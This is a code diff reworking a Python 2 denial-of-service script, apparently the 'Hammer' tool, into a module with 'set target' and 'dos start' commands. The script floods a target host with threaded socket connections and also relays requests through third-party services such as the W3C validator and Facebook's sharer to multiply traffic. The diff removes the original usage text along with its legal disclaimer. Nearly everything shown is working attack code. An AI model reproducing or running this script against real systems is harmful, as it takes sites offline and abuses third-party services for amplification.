@@ -7,15 +7,21 @@
 
 
 from queue import Queue
-from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib2,random
+import time, sys, socket, threading, urllib2, random
+
+usage = ["[?] Dos module usage: set target www.google.com", 
+		 "[?] Dos module usage: dos start"]
 
 host = ''
 port = 80
 thr  = 135
 
+uagents = None
+bots = None
+
 def user_agent():
 	global uagent
+	
 	uagent=[]
 	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
 	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
@@ -29,6 +35,7 @@ def user_agent():
 
 def my_bots():
 	global bots
+	
 	bots=[]
 	bots.append("http://validator.w3.org/check?uri=")
 	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
@@ -38,10 +45,10 @@ def my_bots():
 def bot_hammering(url):
 	try:
 		while True:
-			req = urllib2.urlopen(urllib2.Request(url,headers={'User-Agent': random.choice(uagent)}))
+			urllib2.urlopen(urllib2.Request(url,headers={'User-Agent': random.choice(uagent)}))
 			#print "\033[94mbot is hammering...\033[0m"
 			time.sleep(.1)
-	except:
+	except Exception:
 		time.sleep(.1)
 
 
@@ -58,8 +65,8 @@ def down_it(item):
 				s.shutdown(1)
 				#print "\033[91mshut<->down\033[0m"
 			time.sleep(.1)
-	except socket.error as e:
-		#print "\033[91mno connection! server maybe down\033[0m"
+	except socket.error:
+		print "\033[91mno connection! server maybe down\033[0m"
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -73,22 +80,9 @@ def dos():
 
 def dos2():
 	while True:
-		item=w.get()
+		w.get()
 		bot_hammering(random.choice(bots)+"http://"+host)
 		w.task_done()
-
-
-def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
-	sys.exit()
-
 
 
 # reading headers
@@ -108,7 +102,8 @@ w = Queue()
 def run(url):
 	global host
 
-	host = url
+	host = url.replace("http://", "").replace("www.", "").replace("https://", "")
+	host = host[:-1] if host[-1] == "/" else host
 
 	#print "\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m"
 	#print "\033[94mPlease wait...\033[0m"
@@ -122,7 +117,7 @@ def run(url):
 		s.settimeout(1)
 	except socket.error as e:
 		#print("\033[91mcheck server ip and port\033[0m")
-		usage()
+		pass
 
 	while True:
 		for i in range(int(thr)):
@@ -149,5 +144,5 @@ def run(url):
 		q.join()
 		w.join()
 
-if __name__ == "__main__":
+if __name__ == "__main__":		
 	run(sys.argv[1])
